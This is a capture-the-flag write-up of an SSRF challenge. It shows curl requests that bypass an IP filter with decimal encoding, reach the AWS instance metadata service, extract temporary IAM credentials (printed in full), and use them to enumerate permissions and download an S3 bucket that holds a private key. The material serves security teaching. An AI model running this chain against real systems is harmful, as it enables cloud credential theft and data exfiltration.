# The Red Boxes

## Description


Target URL: http://18.225.5.156
## Solution

Browsing to the given URL we find a web application which shows the status for different servers. 

![](assets/web.png)

Checking the page source we see below JavaScript code.

```javascript
function httpGet()
  {
      var xmlHttp = new XMLHttpRequest();
      xmlHttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.statusCode == 200) {
      
        document.getElementById("redis").innerHTML = '<span class="ok" >Operational</span>';
      }
    else{
      document.getElementById("redis").innerHTML = '<span class="outage" >Outage</span>';
    }
    };
      xmlHttp.open( "POST", "/api/v2/service/check", false );
      xmlHttp.setRequestHeader("Content-Type", "application/json");
      var data = JSON.stringify({"service": "redis", "server": "redis"});
      xmlHttp.send(data);
      setTimeout(httpGet, 5000);
  }
  httpGet();
```

This function sends a POST request to `/api/v2/service/check` API endpoint to check the status of the redis service every five seconds. The request contains `server` parameter which could be the hostname of the target server. This gives an opportunity to perform Server Side Request Forgery. Create a http listener on [request catcher](https://requestcatcher.com/) website. Let's craft a cURL request as shown below. 

```bash
curl -XPOST http://3.19.30.169/api/v2/service/check \
	-H 'Content-Type: application/json' \
	-d '{"service": "redis", "server":"atostest.requestcatcher.com"}'
```

Sending below request we didn't receive any callback in the request catcher and the server responds as `Failed to reach the server`. It is expected as it may have outbound requests blocked in the firewall configuration. We can maybe try to reach the internal network. Checking `localhost` in the `server` address loads the same page response. 

```bash
curl -s -XPOST http://3.19.30.169/api/v2/service/check -H 'Content-Type: application/json' -d '{"service": "redis", "server":"localhost"}' | head

<!DOCTYPE html>
<html lang="en" >
<head>
 <title>Status Check | Bank of Spain</title>
```

This means that we can reach to internal resources. Enumerating the DNS info for given IP reveals that the server is hosted in AWS address space.

```
nslookup 3.19.30.169
169.30.19.3.in-addr.arpa        name = ec2-3-19-30-169.us-east-2.compute.amazonaws.com.
```

We can try to reach the instance metadata service (IMDS) by hitting the `169.254.169.254` IP address. 

```bash
curl -XPOST http://3.19.30.169/api/v2/service/check \
	-H 'Content-Type: application/json' \
	-d '{"service": "redis", "server":"169.254.169.254"}'

Failed to reach the server
```

This fails. Since we've the `localhost` working we can try to see how the validation is being done on server side. Let's test again by passing `127.0.0.1` as `server` parameter. 

```bash
curl -XPOST http://3.19.30.169/api/v2/service/check \
	-H 'Content-Type: application/json' \
	-d '{"service": "redis", "server":"127.0.0.1"}'

Failed to reach the server
```

This failed as well. There could be a regex blocking the IP address space. General approach would be to check `{1..255}.{1..255}.{1..255}.{1..255}` format. Let's try to convert the IP address to decimal which will not have dots in it.

```python
>>> from ipaddress import ip_address
>>> ip_address('127.0.0.1')
IPv4Address('127.0.0.1')
>>> int(ip_address('127.0.0.1'))
2130706433
```

Now let's send the request again using decimal value. 

```bash
curl -s -XPOST http://3.19.30.169/api/v2/service/check -H 'Content-Type: application/json' -d '{"service": "redis", "server":"2130706433"}' | head

<!DOCTYPE html>
<html lang="en" >
<head>
<title>Status Check | Bank of Spain</title>
```

This works. Similarly convert the metadata IP to decimal value and send the request.

```bash
curl -s -XPOST http://3.19.30.169/api/v2/service/check -H 'Content-Type: application/json' -d '{"service": "redis", "server":"2852039166"}' 

1.0
2007-01-19
...
2021-07-15
latest
```

This is successful. Let's enumerate the IAM info. 

```bash
curl -s -XPOST http://3.19.30.169/api/v2/service/check -H 'Content-Type: application/json' -d '{"service": "redis", "server":"2852039166/latest/meta-data/iam/info"}' 
{
  "Code" : "Success",
  "LastUpdated" : "2022-04-11T09:29:01Z",
  "InstanceProfileArn" : "arn:aws:iam::852948644505:instance-profile/Storage",
  "InstanceProfileId" : "AIPA4NF5TOKM4FXCMUN22"
}
```

We see there is a `Storage` role attached to this instance. The role temporary credentials can be requested using `/latest/meta-data/iam/security-credentials/Storage` path. 

```bash
curl -s -XPOST http://3.19.30.169/api/v2/service/check -H 'Content-Type: application/json' -d '{"service": "redis", "server":"2852039166/latest/meta-data/iam/security-credentials/Storage"}' 
{
  "Code" : "Success",
  "LastUpdated" : "2022-04-11T09:29:37Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA4NF5TOKM5T7U2G4V",
  "SecretAccessKey" : "RoifBsy5MeDunpuZWohDlEo+36g2XuzlCWc5kBTy",
  "Token" : "IQoJb3JpZ2luX2VjEI...CnvIUEEUWVulXpxFA==",
  "Expiration" : "2022-04-11T15:58:55Z"
}
```

Let's configure the credentials and enumerate account information. 

```bash
aws configure
AWS Access Key ID [None]: ASIA4NF5TOKM5T7U2G4V
AWS Secret Access Key [None]: RoifBsy5MeDunpuZWohDlEo+36g2XuzlCWc5kBTy
Default region name [None]: us-east-1
Default output format [None]:
```

```bash
aws configure set aws_session_token 'IQoJb3JpZ2luX2VjEI...CnvIUEEUWVulXpxFA=='
```

```bash
aws sts get-caller-identity
{
    "UserId": "AROA4NF5TOKM74RNDMS5A:i-08a4c1a31aab78b67",
    "Account": "852948644505",
    "Arn": "arn:aws:sts::852948644505:assumed-role/Storage/i-08a4c1a31aab78b67"
}
```

Using these credentials we can try some basic enumeration like listing S3 buckets or Lambda functions etc. But for extensive checks we can use [weirdAAL](https://github.com/carnal0wnage/weirdAAL) tool which reports possible privileges this role has. Let's setup the tool.

```bash
git clone https://github.com/carnal0wnage/weirdAAL.git
cd weirdAAL
pip3 install -r requirements.txt
python3 create_dbs.py 
```

Now we export the keys to env. 

```bash
export AWS_ACCESS_KEY_ID=ASIA4NF5TOKM5T7U2G4V
export AWS_SECRET_ACCESS_KEY=RoifBsy5MeDunpuZWohDlEo+36g2XuzlCWc5kBTy
export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEI...CnvIUEEUWVulXpxFA==
```

We can now run the tool. 

```bash
python3 weirdAAL.py -m recon_all -t atosctf

Account Id: 852948644505
ASIA4NF5TOKM5T7U2G4V : Is NOT a root key
### Enumerating AccessAnalyzer Permissions ###
An error occurred (AccessDeniedException) when calling the ListAnalyzers operation: User: arn:aws:sts::852948644505:assumed-role/Storage/i-08a4c1a31aab78b67 i
s not authorized to perform: access-analyzer:ListAnalyzers on resource: arn:aws:access-analyzer:us-east-1:852948644505:*                                      
                                                                     
[-] No accessanalyzer actions allowed [-]
...
### Enumerating S3 Permissions ###
ListBuckets IS allowed                                                                   

[+] s3 Actions allowed are 
[+] ['ListBuckets']       
```

The role has privileges to list S3 buckets like we guessed earlier. Let's list the buckets. 

```bash
aws s3 ls
2022-03-27 02:08:32 aws-codestar-us-east-1-852948644505
2022-03-25 10:44:51 aws-codestar-us-east-2-852948644505
2022-03-27 12:41:09 aws-codestar-us-east-2-852948644505-crimerecordmgmt-pipe
2022-03-28 01:46:30 call-records-1435289453
2022-03-24 12:49:44 state-secrets-96d94a687f88ca15
```

We see many buckets and out of which we only have access to `state-secrets-96d94a687f88ca15` bucket. Let's list the the contents inside it.

```bash
aws s3 ls s3://state-secrets-96d94a687f88ca15/
                           PRE func_adm/
2022-04-11 06:48:37      14510 Classified Information.docx
2022-03-24 12:50:06         31 flag.txt
```

We can use `sync` flag to copy the files recursively to our local machine. 

```bash
aws s3 sync s3://state-secrets-96d94a687f88ca15/ bucket

download: s3://state-secrets-96d94a687f88ca15/Classified Information.docx to bucket/Classified Information.docx
download: s3://state-secrets-96d94a687f88ca15/flag.txt to bucket/flag.txt
download: s3://state-secrets-96d94a687f88ca15/func_adm/id_rsa.pub to bucket/func_adm/id_rsa.pub
download: s3://state-secrets-96d94a687f88ca15/func_adm/id_rsa to bucket/func_adm/id_rsa
```

Flag can be viewed from `bucket/flag.txt` 

```bash
cat bucket/flag.txt 
ACVCTF{ssrf_t0_1mds_1s_fun!!!}
```

